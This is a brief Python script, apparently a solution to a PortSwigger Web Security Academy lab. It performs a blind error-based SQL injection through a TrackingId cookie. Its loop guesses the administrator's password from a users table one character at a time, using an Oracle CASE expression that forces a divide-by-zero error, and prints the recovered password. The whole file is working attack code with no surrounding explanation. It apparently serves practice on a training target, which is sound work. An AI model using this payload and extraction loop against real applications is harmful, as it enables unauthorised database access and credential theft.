
import requests as rq

lis = [i for i in range(0,10)]
lis += [chr(i) for i in range(97,123)]
lis += [chr(i) for i in range(65,91)]

password = ""
for i in range(1,21):
    for j in lis:
        payload = "'+and+(select+case+when+(substr((select+password+from+users+where+username%3d'administrator'),{0},1)%3d'{1}')+then+'a'+else+to_char(1/0)+end+from+dual)%3d'a".format(i,j)

        cookie = {"TrackingId" : "KE5XMKW08QJ9o5QA" + payload}
        res = rq.request("GET","https://0ac2006e0466f13380d303cc000100a2.web-security-academy.net/login",cookies=cookie)

        if "Internal Server Error" not in res.text:
            password += str(j)
            break
        else:
            print(i,j)

print(password)


    